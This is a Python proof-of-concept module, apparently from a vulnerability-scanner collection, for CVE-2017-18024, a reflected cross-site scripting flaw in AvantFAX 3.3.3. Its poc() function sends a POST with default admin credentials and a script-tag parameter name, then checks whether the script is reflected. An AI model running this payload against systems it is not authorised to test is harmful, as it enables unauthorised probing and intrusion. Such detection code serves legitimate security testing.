import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''AvantFAX 3.3.3 XSS''',
        "description": '''AvantFAX 3.3.3 has XSS via an arbitrary parameter name to the default URI, as demonstrated by a parameter whose name contains a SCRIPT element and whose value is 1.''',
        "severity": "medium",
        "references": [
            "https://hackerone.com/reports/963798", 
            "http://packetstormsecurity.com/files/145776/AvantFAX-3.3.3-Cross-Site-Scripting.html", 
            "https://nvd.nist.gov/vuln/detail/CVE-2017-18024"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "cvss-score": "",
            "cve-id": "CVE-2017-18024",
            "cwe-id": "CWE-79"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2017", "xss", "avantfax"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/"""
        method = "POST"
        data = """username=admin&password=admin&_submit_check=1&jlbqg<script>alert("{{randstr}}")</script>b7g0x=1"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""<script>alert("{{randstr}}")</script>""" in resp0.text and """AvantFAX""" in resp0.text) and (resp0.status_code == 200) and ("""text/html""" in str(resp0.headers)):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url